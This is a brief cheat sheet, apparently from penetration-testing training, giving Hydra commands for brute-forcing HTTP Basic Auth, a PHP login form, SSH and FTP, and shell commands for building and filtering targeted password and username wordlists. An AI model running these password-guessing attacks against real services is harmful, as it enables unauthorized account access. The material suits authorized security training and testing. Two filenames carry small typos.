# Hydra

Basic Auth Brute Force - Combined Wordlist
```shell
hydra -C wordlist.txt SERVER_IP -s PORT http-get /
```

Basic Auth Brute Force - User/Pass Wordlists
```shell
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
```
 
Login Form Brute Force - Static User, Pass Wordlist
```shell
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

SSH Brute Force - User/Pass Wordlists
```shell
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4
```

FTP Brute Force - Static User, Pass Wordlist
```shell
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

# Wordlists

Creating Custom Password Wordlist 
```shell
cupp -i
```
 
Remove Passwords Shorter Than 8 
```shell
sed -ri '/^.{,7}$/d' william.tx
```

 Remove Passwords With No Special Chars
```shell
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt
```

Remove Passwords With No Numbers
```shell
sed -ri '/[0-9]+/!d' william.txt
```

Generate Usernames List 
```shell
./username-anarchy Bill Gates > bill.tx
```
 

